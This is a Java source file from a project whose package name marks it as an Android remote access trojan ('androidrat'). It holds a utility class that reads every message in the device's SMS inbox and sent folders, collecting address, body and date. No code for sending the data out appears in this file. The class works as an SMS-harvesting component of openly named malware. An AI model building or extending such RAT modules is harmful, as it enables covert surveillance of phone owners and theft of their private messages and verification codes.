
package com.example.androidrat.Utilities;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.ContextParams;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.example.androidrat.models.Message;

import java.security.Permissions;
import java.security.acl.Permission;
import java.util.ArrayList;
import java.util.List;

public class MessagesUtility {
    private final Activity activity;

    public MessagesUtility(Activity activity) {
        this.activity = activity;
    }
    public List<Message> getReceivedMessages() {
        return getMessages("content://sms/inbox");
    }
    public List<Message> getSentMessages() {
        return getMessages("content://sms/sent");
    }
    private List<Message> getMessages(String uriString) {
        List<Message> messageList = new ArrayList<>();
        Uri uri = Uri.parse(uriString);
        String[] projection = {"_id", "address", "body", "date"};

        Cursor cursor = activity.getContentResolver().query(uri, projection, null, null, "date DESC");

        if (cursor != null && cursor.moveToFirst()) {
            do {
                // Retrieve SMS details
                int addressColumnIndex = cursor.getColumnIndex("address");
                int bodyColumnIndex = cursor.getColumnIndex("body");
                int dateColumnIndex = cursor.getColumnIndex("date");

                String address = cursor.getString(addressColumnIndex);
                String body = cursor.getString(bodyColumnIndex);
                long date = cursor.getLong(dateColumnIndex);

                messageList.add(new Message(address, body, date));
            } while (cursor.moveToNext());

            cursor.close();
        }
        return messageList;
    }

}
